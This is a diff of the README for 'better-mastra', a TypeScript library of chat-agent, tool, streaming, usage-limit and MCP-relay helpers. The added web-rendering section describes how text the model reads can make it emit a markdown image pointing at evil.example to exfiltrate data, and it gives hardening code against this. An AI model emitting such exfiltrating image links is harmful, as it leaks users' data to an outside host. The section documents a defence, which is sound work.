@@ -10,28 +10,29 @@ It stays thin. Mastra runs the agent and keeps the memory, the AI SDK owns the m
 bun add better-mastra @mastra/core @mastra/memory @mastra/ai-sdk ai zod
 ```
 
-ESM only, Node 20+ or Bun. Every other peer is optional and loaded only by the subpath that needs it: `@mastra/pg` and `pg` for `better-mastra/pg`, `hono` for `better-mastra/hono`, `react` or `vue` for the bindings, a provider SDK (`@openrouter/ai-sdk-provider`, `@ai-sdk/anthropic`, …) for each model route you give a key.
+ESM only, Node 20+ or Bun. Every peer is optional and loaded only by the subpath that needs it (the table below says which), so a client-only app or one that uses only the MCP relay installs no Mastra. The line above is what a server with a chat needs; add `@mastra/pg` and `pg` for `better-mastra/pg`, `hono` for `better-mastra/hono`, `react` or `vue` for the bindings, and a provider SDK (`@openrouter/ai-sdk-provider`, `@ai-sdk/anthropic`, …) for each model route you give a key.
 
 ## What's in it
 
-| Import | What it gives you |
-| --- | --- |
-| `better-mastra` | Memory preset, health check, ordered shutdown |
-| `better-mastra/pg`, `better-mastra/libsql` | Mastra storage on Postgres or libSQL that survives dropped connections |
-| `better-mastra/models` | Model registry (`route/model@effort` ids), prompt caching, OpenRouter batching, pricing |
-| `better-mastra/openrouter` | One OpenRouter route, synchronous, for building models at import time |
-| `better-mastra/turn` | `runChatTurn`, the chat agent, request context, reply suggestions, thread handlers |
-| `better-mastra/hono` | The chat route (`POST`, stream, stop) and a local Mastra Studio mount |
-| `better-mastra/resumable` | Turns that keep running past a disconnect, reconnectable across replicas |
-| `better-mastra/tools` | `defineTool`: a tool plus its tier, card and hidden inputs; deferred tools; dry runs |
-| `better-mastra/client` | Framework-free chat session: turns, approvals, client actions, resume, tool cards |
-| `better-mastra/react`, `better-mastra/vue` | Hooks/composables and `ToolParts` over a chat session |
-| `better-mastra/react/markdown` | Streaming markdown for React Native, word by word with fade-in |
-| `better-mastra/dictation` (`/react`, `/vue`, `/server`) | Live speech to text with Soniox |
-| `better-mastra/embeddings` | Cached query embeddings and batched document embeddings |
-| `better-mastra/usage` | Metered `generateText`/`generateObject`, model budgets, per-user rate limits |
-| `better-mastra/evals` | Eval cases, checks and an LLM judge, run through your production turn |
-| `better-mastra/mcp-relay` | Another MCP server's tools offered on your own MCP server, called as the current user |
+| Import | What it gives you | Needs |
+| --- | --- | --- |
+| `better-mastra` | Memory preset, health check, ordered shutdown | `@mastra/core`, `@mastra/memory` |
+| `better-mastra/pg`, `better-mastra/libsql` | Mastra storage on Postgres or libSQL that survives dropped connections | `@mastra/pg` + `pg`, or `@mastra/libsql` |
+| `better-mastra/models` | Model registry (`route/model@effort` ids), prompt caching, OpenRouter batching, pricing | `ai`, `@ai-sdk/provider`, a provider SDK per route |
+| `better-mastra/openrouter` | One OpenRouter route, synchronous, for building models at import time | `@openrouter/ai-sdk-provider` |
+| `better-mastra/turn` | `runChatTurn`, the chat agent, request context, reply suggestions, thread handlers | `@mastra/core`, `@mastra/memory`, `@mastra/ai-sdk`, `ai`, `zod` |
+| `better-mastra/protocol` | The wire contract: part names, refusal codes, outcomes, `chatTurnBodySchema` | `zod` (`ai` types only); safe in a browser |
+| `better-mastra/hono` | The chat route (`POST`, stream, stop) and a local Mastra Studio mount | `hono` (Studio: `@mastra/hono`) |
+| `better-mastra/resumable` | Turns that keep running past a disconnect, reconnectable across replicas | a Redis client, or none |
+| `better-mastra/tools` | `defineTool`: a tool plus its tier, card and hidden inputs; deferred tools; dry runs | `@mastra/core`, `zod` |
+| `better-mastra/client` | Framework-free chat session: turns, approvals, client actions, resume, tool cards | `ai`, `zod` |
+| `better-mastra/react`, `better-mastra/vue` | Hooks/composables and `ToolParts` over a chat session | `ai`, `zod`, `react` or `vue` |
+| `better-mastra/react/markdown` | Streaming markdown for React Native, word by word with fade-in | `react-native`, `react-native-markdown-display` |
+| `better-mastra/dictation` (`/react`, `/vue`, `/server`) | Live speech to text with Soniox | `react` or `vue` for the bindings |
+| `better-mastra/embeddings` | Cached query embeddings and batched document embeddings | `ai` |
+| `better-mastra/usage` | Metered `generateText`/`generateObject`, model budgets, per-user rate limits | `ai`, `@ai-sdk/provider` |
+| `better-mastra/evals` | Eval cases, checks and an LLM judge, run through your production turn | `@mastra/core`, `ai`, `zod` |
+| `better-mastra/mcp-relay` | Another MCP server's tools offered on your own MCP server, called as the current user | `@modelcontextprotocol/client` (+ `/server` for `withRelayedTools`) |
 
 Two CLIs ship with it: `better-mastra-evals` and `better-mastra-tool-manifest`.
 
@@ -46,14 +47,15 @@ import { createMemory } from 'better-mastra'
 import { createChatRoute } from 'better-mastra/hono'
 import { createLlmRegistry } from 'better-mastra/models'
 import { pgStorage } from 'better-mastra/pg'
-import { createChatAgent, runChatTurn } from 'better-mastra/turn'
+import { chatTurnBodySchema, createChatAgent, runChatTurn } from 'better-mastra/turn'
 import { RequestContext } from '@mastra/core/request-context'
 
 const llms = await createLlmRegistry({ keys: { openrouter: process.env.OPENROUTER_API_KEY } })
 const storage = pgStorage({ connectionString: process.env.DATABASE_URL })
 const memory = createMemory({ storage: storage.store })
 const agent = createChatAgent({ id: 'chat', memory })
-const mastra = new Mastra({ agents: { chat: agent }, storage: storage.store })
+// Your own logger, or false: Mastra's default console logger can write a run's inputs and tool results.
+const mastra = new Mastra({ agents: { chat: agent }, storage: storage.store, logger: false })
 
 await storage.init() // once, in the process that migrates
 
@@ -62,7 +64,7 @@ const app = new Hono()
 app.route('/', createChatRoute({
 	path: '/chat',
 	auth: (c) => getUser(c), // null answers 401
-	parseBody: (json) => chatBodySchema.safeParse(json).data, // undefined answers 400
+	parseBody: (json) => chatTurnBodySchema.safeParse(json).data, // undefined answers 400
 	runTurn: (request) =>
 		runChatTurn(request, {
 			mastra,
@@ -81,7 +83,11 @@ app.route('/', createChatRoute({
 }))
 ```
 
-`runChatTurn` takes the rest as optional ports: `gate` (access and consent), `lock` (one turn per thread), `admit` (usage limits), `sinks` (tool, usage and finished-turn events), `replySuggestions`, `deriveTitle`. Every refusal reaches the client as a fixed error code, never a raw error, and every failure is logged with the stage it happened in.
+`chatTurnBodySchema` (also in the browser-safe `better-mastra/protocol`) parses the body the chat session sends; `chatTurnBodySchema.extend({ pageContext })` adds your own fields.
+
+`runChatTurn` takes the rest as optional ports: `gate` (access and consent), `lock` (one turn per thread), `admit` (usage limits), `sinks` (tool, usage and finished-turn events), `replySuggestions`, `deriveTitle`. Every refusal reaches the client as a fixed error code, never a raw error, and every failure is logged with the stage it happened in. A user message over `maxMessageLength` (32,000 characters) is refused as `message_too_long` (413), so the client can say why.
+
+`sinks.turnFinished` gets the outcome (`turnOutcomes`: `answered`, `stopped`, `interrupted` when a newer turn or a shutdown ended it, `budget_stop`, `timeout`, `error`) and the run's `usage`, typed for `readStreamTextUsage`, `llms.cost` and `withUsage().meterStream(event.usage, …)`.
 
 ### Client
 
@@ -120,7 +126,9 @@ llms.resolveMastraLlm('google/gemini-3.5-flash') // typed for a Mastra agent
 await llms.cost({ modelId, steps, usage }) // reported by the route, or estimated from pricing
 ```
 
-A route without a key is not loaded, nor is its SDK, so missing optional peers never break startup. Built-in routes: `openrouter`, `anthropic-direct`, `openai`, `requesty`, `inception`, `vertex-eu`; add or replace routes with `routes`. Keep the full id in config and metrics; only the SDK sees the provider's id.
+A route without a key is not loaded, nor is its SDK, so missing optional peers never break startup. Built-in routes: `openrouter`, `anthropic-direct`, `openai-direct`, `requesty`, `inception`, `vertex-eu`; add or replace routes with `routes`. Keep the full id in config and metrics; only the SDK sees the provider's id. `parseModelId(id, { routes })` reads an id the same way without loading the registry or its keys.
+
+A model missing from the pricing table costs `null` on a route that does not report its own spend (Vertex, Inception, the direct APIs); pass `pricing` for the models you use.
 
 Also here: `withPromptCache` / `promptCacheMiddleware` for provider prompt caching, `withLlmMode('batch')` to send background work through OpenRouter's Batch API, `anthropicSafeZodSchema`, `estimateModelCostUsd`, and `AiBillingError` for 402s.
 
@@ -129,7 +137,8 @@ Also here: `withPromptCache` / `promptCacheMiddleware` for provider prompt cachi
 - **`createChatAgent`**: a Mastra agent whose instructions, model, tools and options come from the turn plan `prepare` returns, so "what does the model get" has one answer. Turn and first-chunk timeouts, a tool-call budget, retries on provider failure, and `stopAfterTools` to end a run after a question card or a handoff.
 - **`runChatTurn`**: one chat request after authentication (see the quick start).
 - **`defineRequestContext(schema)`**: typed request context values; `defineRequestContextHolder` for values that must never be serialized into a snapshot or span.
-- **`createThreadHandlers`**: list, read and delete the caller's threads, and rate answers. `sweepOldThreads` and `sweepAbandonedRuns` clean up.
+- **`createThreadHandlers`**: list, read and delete the caller's threads, and rate answers. `ownsThread({ memory, threadId, resourceId })` is the check `createChatRoute` needs with `resumable`.
+- **`sweepOldThreads`** and **`sweepAbandonedRuns`**: nothing runs them for you. Without a scheduled job of yours, old threads (with the customer text they quote) and suspended approvals stay in the `mastra` schema for good.
 - **`createReplySuggestionsAgent`**: short replies offered after an answer.
 - **`defineModelArms`**: model experiments by thread: a thread keeps its arm for life.
 
@@ -155,7 +164,23 @@ export const tools = [
 const { tools: toolset, toolTiers } = toToolSet(tools) // for the turn plan
 ```
 
-`better-mastra-tool-manifest src/tools.ts src/generated/tool-manifest.ts` writes the client's manifest from the same definitions. A tool without `execute` is a client tool. `deferredTool` and `deferredToolSearch` keep a large tool catalog out of the prompt without breaking Anthropic's prompt cache; `markDryRun` turns every write into a marker for evals.
+`better-mastra-tool-manifest src/tools.ts src/generated/tool-manifest.ts` writes the client's manifest from the same definitions; `--name` names the export, `--type Manifest:./types` annotates it with your type, and `--check` (for CI) fails when the file is out of date. On the client, `createToolRefresh(toolManifest, { tasks: refetchTasks })` is an `onToolResult` that refetches what each tool `invalidates`, typed so a namespace without a refetch fails the typecheck.
+
+A tool without `execute` is a client tool. `meta` keeps your server's own data on a definition (a gate, a permission) without it reaching the manifest. `deferredTool` and `deferredToolSearch` keep a large tool catalog out of the prompt without breaking Anthropic's prompt cache; `markDryRun` turns every write into a marker for evals. `jsonSchemaInput(schema)` takes a JSON Schema, such as an MCP tool's, as a tool input.
+
+Whatever `execute` throws is what the model, the stored thread and the client read. With `maskErrors: true` (or `{ sentence, onError }`), only a `ToolRefusal`'s message and an abort get through; any other error goes to `onError` and the model reads one fixed sentence:
+
+```ts
+defineTool({
+	tool: { id: 'tasks.rename', description, inputSchema, execute: async ({ taskId }) => {
+		const task = await tasks.find(taskId)
+		if (!task) throw new ToolRefusal('No task has that id.') // the model reads this and can try again
+		return tasks.rename(task) // a database error here reaches only your log
+	} },
+	tier: 'approval',
+	maskErrors: { onError: (error, { tool }) => logger.error('tool failed', { tool, error }) }
+})
+```
 
 ## Chat client (`better-mastra/client`, `/react`, `/vue`)
 
@@ -167,7 +192,30 @@ const { tools: toolset, toolTiers } = toToolSet(tools) // for the turn plan
 - **Streaming text**: `useWordReveal(text, streaming)` reveals whole words every 40 ms. In React Native, `<StreamingMarkdown text streaming />` from `better-mastra/react/markdown` renders it, re-parsing only the last paragraph.
 - **Resume**: with `resume: true` and `resumeOn: [resumeOnVisible, resumeOnOnline]` (or `resumeOnAppActive(AppState)` and `resumeOnNetworkRegain(NetInfo)` in React Native) the session reattaches to a running answer.
 
+- **Events**: `onToolResult` per tool result, `onSaved` when a request ended with its answer stored (never for a stop, a failure or a reattach that found nothing), `onFailure` for analytics. `pendingApproval(turn)` is the approval a waiting turn waits for. `prepareBody(request, body)` gets the default body to add your fields to. A refusal carries `retryAfterSeconds` when the server sent one.
+
 Nothing in `/client` or `/react` touches the DOM, so both run in React Native.
+
+### Rendering an answer on the web
+
+The answer is untrusted text: the model writes it from whatever its tools read, and a document can tell it what to write. A markdown renderer built for your own content will happily load `![](https://evil.example/?d=…)` as the answer streams, sending what the model read to another host with no click. Render answers with raw HTML off, no images or other remote loads, and links limited to `isSafeUrl` from `better-mastra/client` (the React Native `StreamingMarkdown` already does this). With markdown-it:
+
+```ts
+import MarkdownIt from 'markdown-it'
+import { isSafeUrl } from 'better-mastra/client'
+
+const answerMarkdown = new MarkdownIt({ html: false, linkify: true })
+answerMarkdown.disable(['image'])
+answerMarkdown.validateLink = (url) => isSafeUrl(url)
+// Open links in a new tab without the opener.
+answerMarkdown.renderer.rules.link_open = (tokens, i, options, _env, self) => {
+	tokens[i]?.attrSet('target', '_blank')
+	tokens[i]?.attrSet('rel', 'noopener noreferrer nofollow')
+	return self.renderToken(tokens, i, options)
+}
+
+const html = answerMarkdown.render(text)
+```
 
 ## Runtime presets
 
@@ -205,13 +253,21 @@ import { RedisClient } from 'bun'
 import { createChatRoute } from 'better-mastra/hono'
 import { bunRedis, createResumableStreams } from 'better-mastra/resumable'
 
-const resumable = createResumableStreams({ redis: bunRedis(new RedisClient(process.env.REDIS_URL)) })
+// A command client with command timeouts cannot duplicate itself: pass `connect` for the blocking connections.
+const resumable = createResumableStreams({
+	redis: bunRedis(commands, { connect: () => new RedisClient(process.env.REDIS_URL) })
+})
 
-app.route('/', createChatRoute({ path: '/chat', auth, parseBody, runTurn, resumable, ownsThread }))
+app.route('/', createChatRoute({
+	path: '/chat', auth, parseBody, runTurn, resumable,
+	ownsThread: (threadId, auth) => ownsThread({ memory, threadId, resourceId: `user:${auth.id}` })
+}))
 
-// shutdown: waits for active turns (drainTimeoutMs)
+// shutdown: new turns get 503 { status: 'draining' }, which the client retries; active ones get drainTimeoutMs (90 s)
 await resumable.close()
 ```
+
+`close()` waits up to `drainTimeoutMs` (90 s, past the agent's 80 s turn timeout) for running turns, then aborts the rest; keep your platform's shutdown grace longer than that. A turn the registry aborts carries the reason (`stop`, `superseded`, `shutdown`) on its signal, and only `stop` counts as the user stopping.
 
 Leave `redis` out for one process (local development, a single instance): turns are then resumable and stoppable on that process only.
 
@@ -270,7 +326,7 @@ Failure behaviour: a buffer over `maxBufferBytes` (2 MB) keeps streaming but new
 
 ## Usage and limits (`better-mastra/usage`)
 
-`withUsage({ llms, sink })` returns `generateText`, `generateObject` and `meterStream` that report every run's tokens and cost to your sink. `createModelBudget` caps concurrent background model calls per provider and backs off on 429s.
+`withUsage({ llms, sink, onSinkError })` returns `generateText`, `generateObject` and `meterStream` that report every run's tokens and cost to your sink; `meterStream` also takes a finished run's values, such as the turn's `usage`. A sink that throws loses its row: log it with `onSinkError`. `createModelBudget` caps concurrent background model calls per provider and backs off on 429s.
 
 `admitUserRequest` charges one request against every window of a user's operation at once, or refuses it with the seconds until the fullest window has room. The keys hold an HMAC of the user id, never the id itself. Pass any Redis client's `EVAL`:
 
@@ -289,6 +345,16 @@ const admission = await admitUserRequest({
 	]
 })
 // { kind: 'admitted' } | { kind: 'limited', retryAfterSeconds } | { kind: 'unavailable', error }
+```
+
+`unavailable` means Redis failed or did not answer within `timeoutMs` (3 s), and the choice is yours: let the request through or refuse it. `admissionRefusal` makes it explicit for the turn's `admit`, and a limited request reaches the client with `Retry-After`:
+
+```ts
+admit: async (scope) =>
+	admissionRefusal(await admitUserRequest({ ...limits, userId: scope.userId }), {
+		whenUnavailable: 'admit', // fail open; 'refuse' answers temporarily_unavailable
+		onUnavailable: (error) => logger.warn('usage limit unavailable', { error })
+	})
 ```
 
 ## Dictation (`better-mastra/dictation`)
@@ -337,33 +403,36 @@ Offers a remote MCP server's tools on your own MCP server, so its consumers use 
 import { createMcpRelay, withRelayedTools } from 'better-mastra/mcp-relay'
 
 // Once per remote, at module scope.
-const feedloop = createMcpRelay<{ userId: string }>({
-	url: new URL('/mcp/reporter', feedloopBaseUrl),
-	prefix: 'feedloop_', // optional, put before every remote tool's name
+const feedback = createMcpRelay<{ userId: string }>({
+	url: new URL('/mcp/reporter', feedbackBaseUrl),
+	prefix: 'feedback_', // optional, put before every remote tool's name
 	headers: async ({ userId }) => ({ Authorization: `Bearer ${await reporterTokenFor(userId)}` }),
-	onError: (error, event) => logger.warn('Feedloop relay failed', { ...event, error }) // never gets arguments
+	onError: (error, event) => logger.warn('Feedback relay failed', { ...event, error }) // never gets arguments
 })
+feedback.warm() // discover at boot, so no request waits for it
 
 // Per request, around whatever registers your own tools (here orpc-fn):
 const handler = createMcpHandler(async ({ authInfo }) => {
 	const { userId } = authInfo.extra.context
 	const server = new McpServer(
 		{ name: 'app', version: '1.0.0' },
-		{ instructions: `${ownInstructions}\n\n${await feedloop.instructions()}`, capabilities: { tools: {} } }
+		{ instructions: `${ownInstructions}\n\n${await feedback.instructions()}`, capabilities: { tools: {} } }
 	)
-	registerMcpTools(withRelayedTools(server.server, [feedloop], { caller: { userId } }), router, options)
+	registerMcpTools(withRelayedTools(server.server, [feedback], { caller: { userId } }), router, options)
 	return server
 })
 ```
 
 - `withRelayedTools` keeps your `tools/list` and `tools/call` handlers and answers both with your tools and the relayed ones. A call to one of your tools never reaches a remote. Your server must declare the `tools` capability.
-- Nothing reaches the remote until a relayed tool is listed or called, or `instructions()` is read. Then the relay discovers the remote once for the process, without a caller's headers, and keeps the answer. On a 2026-07-28 remote each call is then one HTTP request; a 2025-era remote gets an `initialize` per call.
-- A remote that is down or takes over 5 s leaves your own tools working: the listing has only yours, `instructions()` gives `''`, and the relay tries again after 30 s.
+- Nothing reaches the remote until a relayed tool is listed or called, `instructions()` is read or `warm()` is called. Then the relay discovers the remote, without a caller's headers, keeps the answer, and refreshes it in the background once it is older than `discovery.refreshAfterMs` (10 minutes), so a remote's new tools arrive without a restart. On a 2026-07-28 remote each call is then one HTTP request; a 2025-era remote gets an `initialize` per call.
+- A remote that is down, or whose whole discovery takes longer than `discovery.timeoutMs` (5 s), leaves your own tools working: the listing has only yours, `instructions()` gives `''`, a call says the service could not be reached, and the relay tries again after `discovery.retryAfterMs` (30 s).
+- `known: { tools, instructions }` (such as the list the remote's SDK ships) is offered at once, before any discovery answered, and a call to one of those tools goes to the remote even while discovery fails. Then nothing waits on the remote.
+- `tools: { file_feedback: { as: 'send_feedback' } }` offers only the tools you name, under names you choose. `hiddenInputs: { app: (caller) => caller.app }` removes an input from every listed schema and fills it on each call, for the tools whose schema has it.
 - A refused credential (401, 403), any other HTTP failure and a remote error come back as a tool error result the agent can read. Only an aborted call throws. Neither the error text nor `onError` repeats the call's arguments.
 - A relayed tool named like one of yours, or like another relay's, fails `tools/list`. Give the relay a `prefix`.
 - `relay.tools()` and `relay.callTool(name, args, caller)` are there for a server that registers its tools another way.
 
-The subpath loads `@modelcontextprotocol/client` and nothing from Mastra or the AI SDK, so an app without them can use it. Install `better-mastra @modelcontextprotocol/client @modelcontextprotocol/server` (MCP SDK 2.x). Bun then also installs the package's required Mastra peers (`@mastra/core`, `@mastra/memory`, `@mastra/ai-sdk`) and leaves your own `ai` version as it is; this subpath loads none of them. npm refuses an `ai` older than 7 as a peer conflict, so it needs `--legacy-peer-deps`.
+The subpath loads `@modelcontextprotocol/client` and nothing from Mastra or the AI SDK, so an app without them can use it: install `better-mastra @modelcontextprotocol/client @modelcontextprotocol/server` (MCP SDK 2.x). Every Mastra and AI SDK peer is optional, so nothing else is installed for it.
 
 ## Mastra Studio
 
